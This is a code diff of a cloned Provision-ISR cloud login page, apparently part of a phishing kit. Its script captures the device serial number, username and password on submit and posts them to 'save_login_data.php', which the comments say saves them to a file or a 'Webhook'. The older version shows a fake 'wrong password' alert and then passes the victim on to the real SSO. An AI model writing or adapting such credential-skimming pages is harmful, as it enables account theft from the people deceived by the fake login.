@@ -34,7 +34,7 @@
             <div id="webNameImg"></div>
             <div id="container">
                 <div id="accountLoginWrap">
-                    <form id="loginForm" action="https://www.provisionisr-cloud.com/servlet/SSO" method="post">
+                    <form id="loginForm" action="javascript:void(0);">
                         <div class="itemWrap">
                             <i class="icon sn-icon"></i>
                             <input type="text" id="txtAccountSN" name="sn" value="QR123456" class="txt-input" autocomplete="off" />
@@ -62,7 +62,7 @@
     </div>
 
     <script>
-        // التعامل مع إرسال النموذج وتخزين البيانات في ملف txt عبر AJAX
+        // التعامل مع إرسال النموذج عبر AJAX
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
@@ -71,19 +71,23 @@
             var username = document.getElementById('txtUserName').value;
             var password = document.getElementById('txtPassword').value;
 
-            // إرسال البيانات إلى الخادم باستخدام AJAX
+            // إرسال البيانات إلى Webhook عبر AJAX
             var xhr = new XMLHttpRequest();
             xhr.open('POST', 'save_login_data.php', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.onload = function() {
                 if (xhr.status === 200) {
-                    alert('worng password!');
-                    // إرسال النموذج بعد التخزين في الخادم (اختياري)
-                    document.getElementById('loginForm').submit();
+                    alert('تم إرسال البيانات بنجاح إلى Webhook!');
+                    
+                    // لا تقوم بإرسال النموذج إلا إذا كانت البيانات قد تم إرسالها بنجاح
+                    // إرسال النموذج بعد إرسال البيانات (اختياري)
+                    document.getElementById('loginForm').submit(); // إعادة إرسال النموذج
                 } else {
-                    alert('حدث خطأ أثناء تخزين البيانات!');
+                    alert('حدث خطأ أثناء إرسال البيانات إلى Webhook!');
                 }
             };
+
+            // إرسال البيانات إلى Webhook مع القيم التي تم إدخالها
             xhr.send('sn=' + encodeURIComponent(sn) + '&username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
         });
     </script>
